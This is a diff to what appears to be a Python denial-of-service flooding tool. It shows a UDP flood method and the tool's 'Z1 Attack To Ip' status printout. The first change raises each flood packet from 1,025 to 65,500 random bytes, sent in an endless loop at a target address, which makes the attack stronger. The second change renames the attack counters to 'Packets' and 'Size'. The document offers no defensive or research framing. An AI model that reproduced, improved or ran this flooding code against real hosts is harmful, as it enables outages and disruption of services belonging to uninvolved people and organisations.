@@ -459,7 +459,7 @@ class Layer4(Thread):
     def UDP(self) -> None:
         s = None
         with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
-            while Tools.sendto(s, randbytes(1025), self._target):
+            while Tools.sendto(s, randbytes(65500), self._target):
                 continue
         Tools.safe_close(s)
 
@@ -1550,7 +1550,7 @@ if __name__ == '__main__':
               event.set()
               ts = time()
               while time() < ts + timer:
-                  print(f'{bcolors.OKCYAN}[ + ]{bcolors.FAIL}Z1 Attack To Ip:{bcolors.OKCYAN} %s,{bcolors.FAIL} Port:{bcolors.OKCYAN} %s,{bcolors.FAIL} Method:{bcolors.OKCYAN} %s{bcolors.FAIL} PPS:{bcolors.OKCYAN} %s,{bcolors.FAIL} BPS:{bcolors.OKCYAN} %s / %d%%{bcolors.RESET}' %
+                  print(f'{bcolors.OKCYAN}[ + ]{bcolors.FAIL} Z1 Attack To Ip:{bcolors.OKCYAN} %s,{bcolors.FAIL} Port:{bcolors.OKCYAN} %s,{bcolors.FAIL} Method:{bcolors.OKCYAN} %s{bcolors.FAIL} Packets:{bcolors.OKCYAN} %s,{bcolors.FAIL} Size:{bcolors.OKCYAN} %s / %d%%{bcolors.RESET}' %
                                (target or url.host,
                                 port or (url.port or 80),
                                 method,
